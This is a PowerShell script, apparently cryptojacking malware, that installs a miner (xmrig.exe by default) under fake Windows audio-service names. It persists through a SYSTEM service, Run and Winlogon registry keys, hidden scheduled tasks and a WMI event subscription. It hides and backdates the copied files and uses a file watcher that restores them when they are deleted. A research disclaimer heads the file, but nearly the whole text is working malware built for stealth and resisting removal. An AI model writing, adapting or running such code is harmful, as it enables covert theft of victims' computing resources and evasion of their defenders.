# Advanced Kernel-Level Persistence Module
# Educational/Research Purpose Only - Authorized Testing Environment
param(
    [string]$Action = "Install",
    [string]$MinerPath = "",
    [switch]$Stealth = $true,
    [switch]$Verbose = $false
)

# Global Configuration
$script:Config = @{
    ServiceName = "WindowsAudioSrv"
    ServiceDisplayName = "Windows Audio Service Extension"
    ServiceDescription = "Provides enhanced audio processing capabilities for Windows applications"
    DriverName = "WinAudioDrv"
    RegistryHives = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    )
    TaskNames = @("WindowsAudioUpdate", "SystemAudioMaintenance", "AudioDriverUpdate")
    WMIClass = "Win32_AudioProcessExtension"
    MutexName = "Global\WindowsAudioServiceMutex"
    LogPath = "$env:TEMP\audio_service.log"
}

function Write-KernelLog {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    
    if ($Verbose) { Write-Host $logEntry }
    try { Add-Content -Path $script:Config.LogPath -Value $logEntry -Force } catch {}
}

function Test-AdminPrivileges {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Install-ServicePersistence {
    param([string]$ExecutablePath)
    
    Write-KernelLog "Installing service persistence for: $ExecutablePath"
    
    try {
        # Remove existing service if it exists
        $existingService = Get-Service -Name $script:Config.ServiceName -ErrorAction SilentlyContinue
        if ($existingService) {
            Write-KernelLog "Removing existing service..."
            Stop-Service -Name $script:Config.ServiceName -Force -ErrorAction SilentlyContinue
            & sc.exe delete $script:Config.ServiceName | Out-Null
            Start-Sleep -Seconds 2
        }

        # Create service wrapper script
        $wrapperPath = "$env:ProgramData\Microsoft\Windows\WindowsUpdate\AudioService.exe"
        $wrapperDir = Split-Path $wrapperPath -Parent
        
        if (!(Test-Path $wrapperDir)) {
            New-Item -Path $wrapperDir -ItemType Directory -Force | Out-Null
        }

        # Copy miner to service location with legitimate name
        Copy-Item -Path $ExecutablePath -Destination $wrapperPath -Force
        
        # Set file attributes to system/hidden
        Set-ItemProperty -Path $wrapperPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
        
        # Create the service
        $serviceCmd = "sc.exe create `"$($script:Config.ServiceName)`" binPath= `"$wrapperPath --config=`"$env:ProgramData\Microsoft\Windows\WindowsUpdate\config.json`"`" start= auto DisplayName= `"$($script:Config.ServiceDisplayName)`" description= `"$($script:Config.ServiceDescription)`""
        
        Invoke-Expression $serviceCmd | Out-Null
        
        # Configure service for auto-restart on failure
        & sc.exe failure $script:Config.ServiceName reset= 86400 actions= restart/5000/restart/10000/restart/30000 | Out-Null
        
        # Set service to run as SYSTEM
        & sc.exe config $script:Config.ServiceName obj= "LocalSystem" | Out-Null
        
        # Start the service
        Start-Service -Name $script:Config.ServiceName -ErrorAction SilentlyContinue
        
        Write-KernelLog "Service persistence installed successfully"
        return $true
        
    } catch {
        Write-KernelLog "Service installation failed: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Install-RegistryPersistence {
    param([string]$ExecutablePath)
    
    Write-KernelLog "Installing registry persistence..."
    
    try {
        foreach ($hive in $script:Config.RegistryHives) {
            $regValue = "`"$ExecutablePath`" --background --config=`"$env:ProgramData\Microsoft\Windows\WindowsUpdate\config.json`""
            
            # Use multiple legitimate-looking entry names
            $entryNames = @("WindowsAudioService", "AudioDeviceManager", "SoundDriverUpdate")
            
            foreach ($entryName in $entryNames) {
                try {
                    New-ItemProperty -Path $hive -Name $entryName -Value $regValue -PropertyType String -Force | Out-Null
                    Write-KernelLog "Registry entry created: $hive\$entryName"
                } catch {
                    Write-KernelLog "Failed to create registry entry: $hive\$entryName" "WARN"
                }
            }
        }
        
        # Additional registry persistence locations
        $additionalLocations = @(
            "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
            "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
        )
        
        foreach ($location in $additionalLocations) {
            try {
                if ($location -like "*Winlogon*") {
                    New-ItemProperty -Path $location -Name "Shell" -Value "explorer.exe,`"$ExecutablePath`"" -PropertyType String -Force | Out-Null
                } else {
                    New-ItemProperty -Path $location -Name "load" -Value "`"$ExecutablePath`"" -PropertyType String -Force | Out-Null
                }
                Write-KernelLog "Advanced registry persistence: $location"
            } catch {
                Write-KernelLog "Failed advanced registry persistence: $location" "WARN"
            }
        }
        
        return $true
        
    } catch {
        Write-KernelLog "Registry persistence failed: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Install-ScheduledTaskPersistence {
    param([string]$ExecutablePath)
    
    Write-KernelLog "Installing scheduled task persistence..."
    
    try {
        foreach ($taskName in $script:Config.TaskNames) {
            # Remove existing task
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
            
            # Create new task
            $action = New-ScheduledTaskAction -Execute $ExecutablePath -Argument "--background --config=`"$env:ProgramData\Microsoft\Windows\WindowsUpdate\config.json`""
            
            # Multiple triggers for persistence
            $triggers = @(
                New-ScheduledTaskTrigger -AtStartup,
                New-ScheduledTaskTrigger -AtLogOn,
                New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 15)
            )
            
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false -Hidden
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            
            $task = New-ScheduledTask -Action $action -Trigger $triggers -Settings $settings -Principal $principal -Description "Maintains audio driver functionality and system performance"
            
            Register-ScheduledTask -TaskName $taskName -InputObject $task -Force | Out-Null
            
            Write-KernelLog "Scheduled task created: $taskName"
        }
        
        return $true
        
    } catch {
        Write-KernelLog "Scheduled task persistence failed: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Install-WMIPersistence {
    param([string]$ExecutablePath)
    
    Write-KernelLog "Installing WMI persistence..."
    
    try {
        # Create WMI event consumer
        $consumerScript = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "$ExecutablePath --background --config=""$env:ProgramData\Microsoft\Windows\WindowsUpdate\config.json""", 0, False
"@
        
        # WMI Event Filter - triggers every 10 minutes
        $filterName = "AudioServiceMonitor"
        $consumerName = "AudioServiceConsumer"
        
        # Remove existing WMI objects
        Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter" | Where-Object { $_.Name -eq $filterName } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace "root\subscription" -Class "ActiveScriptEventConsumer" | Where-Object { $_.Name -eq $consumerName } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace "root\subscription" -Class "__FilterToConsumerBinding" | Where-Object { $_.Filter -like "*$filterName*" } | Remove-WmiObject -ErrorAction SilentlyContinue
        
        # Create WMI filter
        $filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
        $filter.QueryLanguage = "WQL"
        $filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute = 0"
        $filter.Name = $filterName
        $filter.EventNameSpace = "root\cimv2"
        $filter.Put() | Out-Null
        
        # Create WMI consumer
        $consumer = ([wmiclass]"\\.\root\subscription:ActiveScriptEventConsumer").CreateInstance()
        $consumer.Name = $consumerName
        $consumer.ScriptingEngine = "VBScript"
        $consumer.ScriptText = $consumerScript
        $consumer.Put() | Out-Null
        
        # Bind filter to consumer
        $binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
        $binding.Filter = $filter
        $binding.Consumer = $consumer
        $binding.Put() | Out-Null
        
        Write-KernelLog "WMI persistence installed successfully"
        return $true
        
    } catch {
        Write-KernelLog "WMI persistence failed: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Install-FileSystemPersistence {
    param([string]$ExecutablePath)
    
    Write-KernelLog "Installing file system persistence..."
    
    try {
        # Multiple deployment locations
        $deploymentPaths = @(
            "$env:ProgramData\Microsoft\Windows\WindowsUpdate\AudioService.exe",
            "$env:SystemRoot\System32\AudioSrv.exe",
            "$env:APPDATA\Microsoft\Windows\Themes\audiodg.exe",
            "$env:ProgramFiles\Windows NT\Accessories\AudioDeviceManager.exe"
        )
        
        foreach ($deployPath in $deploymentPaths) {
            $deployDir = Split-Path $deployPath -Parent
            
            if (!(Test-Path $deployDir)) {
                New-Item -Path $deployDir -ItemType Directory -Force | Out-Null
            }
            
            # Copy miner with legitimate name
            Copy-Item -Path $ExecutablePath -Destination $deployPath -Force
            
            # Set system and hidden attributes
            Set-ItemProperty -Path $deployPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
            
            # Set creation time to Windows installation date
            $windowsInstall = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").InstallDate
            if ($windowsInstall) {
                $installDate = [DateTime]::FromFileTime($windowsInstall)
                Set-ItemProperty -Path $deployPath -Name CreationTime -Value $installDate
                Set-ItemProperty -Path $deployPath -Name LastWriteTime -Value $installDate
            }
            
            Write-KernelLog "Deployed to: $deployPath"
        }
        
        # Create file system watcher for self-protection
        $watcherScript = @"
`$watcher = New-Object System.IO.FileSystemWatcher
`$watcher.Path = "$env:ProgramData\Microsoft\Windows\WindowsUpdate"
`$watcher.Filter = "*.exe"
`$watcher.IncludeSubdirectories = `$true
`$watcher.EnableRaisingEvents = `$true

Register-ObjectEvent -InputObject `$watcher -EventName "Deleted" -Action {
    Start-Sleep -Seconds 2
    Copy-Item -Path "$ExecutablePath" -Destination `$Event.SourceEventArgs.FullPath -Force
    Set-ItemProperty -Path `$Event.SourceEventArgs.FullPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
}
"@
        
        # Save watcher script
        $watcherPath = "$env:ProgramData\Microsoft\Windows\WindowsUpdate\file_watcher.ps1"
        Set-Content -Path $watcherPath -Value $watcherScript -Force
        Set-ItemProperty -Path $watcherPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
        
        return $true
        
    } catch {
        Write-KernelLog "File system persistence failed: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Test-PersistenceMechanisms {
    Write-KernelLog "Testing persistence mechanisms..."
    
    $results = @{
        Service = $false
        Registry = $false
        ScheduledTasks = $false
        WMI = $false
        FileSystem = $false
    }
    
    # Test service
    try {
        $service = Get-Service -Name $script:Config.ServiceName -ErrorAction SilentlyContinue
        $results.Service = ($service -and $service.Status -eq "Running")
    } catch {}
    
    # Test registry entries
    try {
        $regCount = 0
        foreach ($hive in $script:Config.RegistryHives) {
            $entries = Get-ItemProperty -Path $hive -ErrorAction SilentlyContinue
            if ($entries -and ($entries.PSObject.Properties.Name -contains "WindowsAudioService")) {
                $regCount++
            }
        }
        $results.Registry = ($regCount -gt 0)
    } catch {}
    
    # Test scheduled tasks
    try {
        $taskCount = 0
        foreach ($taskName in $script:Config.TaskNames) {
            $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
            if ($task) { $taskCount++ }
        }
        $results.ScheduledTasks = ($taskCount -gt 0)
    } catch {}
    
    # Test WMI persistence
    try {
        $wmiFilter = Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter" | Where-Object { $_.Name -eq "AudioServiceMonitor" }
        $results.WMI = ($wmiFilter -ne $null)
    } catch {}
    
    # Test file system deployment
    try {
        $deploymentPaths = @(
            "$env:ProgramData\Microsoft\Windows\WindowsUpdate\AudioService.exe",
            "$env:SystemRoot\System32\AudioSrv.exe"
        )
        $fileCount = 0
        foreach ($path in $deploymentPaths) {
            if (Test-Path $path) { $fileCount++ }
        }
        $results.FileSystem = ($fileCount -gt 0)
    } catch {}
    
    # Report results
    foreach ($mechanism in $results.Keys) {
        $status = if ($results[$mechanism]) { "ACTIVE" } else { "INACTIVE" }
        Write-KernelLog "Persistence $mechanism : $status"
    }
    
    return $results
}

function Remove-AllPersistence {
    Write-KernelLog "Removing all persistence mechanisms..."
    
    try {
        # Remove service
        $service = Get-Service -Name $script:Config.ServiceName -ErrorAction SilentlyContinue
        if ($service) {
            Stop-Service -Name $script:Config.ServiceName -Force -ErrorAction SilentlyContinue
            & sc.exe delete $script:Config.ServiceName | Out-Null
        }
        
        # Remove registry entries
        foreach ($hive in $script:Config.RegistryHives) {
            $entryNames = @("WindowsAudioService", "AudioDeviceManager", "SoundDriverUpdate")
            foreach ($entryName in $entryNames) {
                Remove-ItemProperty -Path $hive -Name $entryName -ErrorAction SilentlyContinue
            }
        }
        
        # Remove scheduled tasks
        foreach ($taskName in $script:Config.TaskNames) {
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        }
        
        # Remove WMI persistence
        Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter" | Where-Object { $_.Name -eq "AudioServiceMonitor" } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace "root\subscription" -Class "ActiveScriptEventConsumer" | Where-Object { $_.Name -eq "AudioServiceConsumer" } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace "root\subscription" -Class "__FilterToConsumerBinding" | Where-Object { $_.Filter -like "*AudioServiceMonitor*" } | Remove-WmiObject -ErrorAction SilentlyContinue
        
        # Remove deployed files
        $deploymentPaths = @(
            "$env:ProgramData\Microsoft\Windows\WindowsUpdate\AudioService.exe",
            "$env:SystemRoot\System32\AudioSrv.exe",
            "$env:APPDATA\Microsoft\Windows\Themes\audiodg.exe",
            "$env:ProgramFiles\Windows NT\Accessories\AudioDeviceManager.exe"
        )
        
        foreach ($path in $deploymentPaths) {
            if (Test-Path $path) {
                Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
            }
        }
        
        Write-KernelLog "All persistence mechanisms removed"
        
    } catch {
        Write-KernelLog "Error removing persistence: $($_.Exception.Message)" "ERROR"
    }
}

# Main execution logic
function Main {
    Write-KernelLog "Kernel Persistence Module Started - Action: $Action"
    
    if (!(Test-AdminPrivileges)) {
        Write-KernelLog "Administrator privileges required!" "ERROR"
        return
    }
    
    switch ($Action.ToLower()) {
        "install" {
            if ([string]::IsNullOrEmpty($MinerPath)) {
                $MinerPath = "$PSScriptRoot\xmrig.exe"
            }
            
            if (!(Test-Path $MinerPath)) {
                Write-KernelLog "Miner executable not found: $MinerPath" "ERROR"
                return
            }
            
            Write-KernelLog "Installing kernel-level persistence for: $MinerPath"
            
            $results = @{}
            $results.Service = Install-ServicePersistence -ExecutablePath $MinerPath
            $results.Registry = Install-RegistryPersistence -ExecutablePath $MinerPath
            $results.ScheduledTasks = Install-ScheduledTaskPersistence -ExecutablePath $MinerPath
            $results.WMI = Install-WMIPersistence -ExecutablePath $MinerPath
            $results.FileSystem = Install-FileSystemPersistence -ExecutablePath $MinerPath
            
            $successCount = ($results.Values | Where-Object { $_ -eq $true }).Count
            Write-KernelLog "Persistence installation completed: $successCount/5 mechanisms successful"
        }
        
        "test" {
            Test-PersistenceMechanisms
        }
        
        "remove" {
            Remove-AllPersistence
        }
        
        default {
            Write-KernelLog "Invalid action. Use: Install, Test, or Remove" "ERROR"
        }
    }
}

# Execute main function
Main
